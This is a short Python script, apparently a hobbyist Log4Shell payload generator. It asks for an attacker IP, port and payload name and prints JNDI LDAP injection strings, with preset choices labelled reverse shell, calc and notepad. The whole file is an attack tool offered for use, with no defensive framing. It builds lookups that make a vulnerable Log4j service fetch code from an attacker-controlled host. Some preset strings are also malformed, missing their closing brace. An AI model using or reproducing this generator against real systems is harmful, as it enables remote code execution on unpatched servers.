import os, sys
import time
t = time
print("Github : github.com/magnouni")
print("Instagram : instagram.com/pnl_anonymous")
print("Welcom To Log4Shell Payload Generator")
t.sleep(1)
t.sleep(0.5)
host = input("Please Enter Your IP : ")
t.sleep(0.6)
port = input("Please Enter A Port : ")
payload_name = input("Your Payload Name [example: payload.jar] : ")
payload_make = input("Type The Payload : ")
payload = "${jndi:ldap://"+host+":"+port+"/"+payload_name+"}"
os.system("touch Payloads/"+payload_name)
t.sleep(3)
with open('Payloads/'+payload_name+'','''w''') as f:
	f.writelines(payload_make)
	
print("\033[1;34;40m  [*]Your Payload Is : "+payload+"  \033 \n")
default_payload = input("Do You Want A Default Payload ? [y/n]: ")	
	  
 #### 			####				####  ###
rce = "${jndi:ldap://"+host+":"+port+"/.default/rce.java"	 ##
np = "${jndi:ldap://"+host+":"+port+"/.default/np.java"		##
calc = "${jndi:ldap://"+host+":"+port+"/.default/calc.java"    ##
 #### 			####				#### ##	
print("""
		[1] RCE reverse shell
		[2] Run Calc
		[3] Run NotePad
	""") 
pay_c = input("??: ")
if pay_c == "1":
	print("\033[1;34;40m  [*]Your Payload Is : "+rce+"  \033 \n")
if pay_c == "2":
	print("\033[1;34;40m  [*]Your Payload Is : "+calc+"  \033 \n")  
if pay_c == "3":
	print("\033[1;34;40m  [*]Your Payload Is : "+np+"  \033 \n")   
else:
	sys.exit("Thank For Using My Script ! ")      
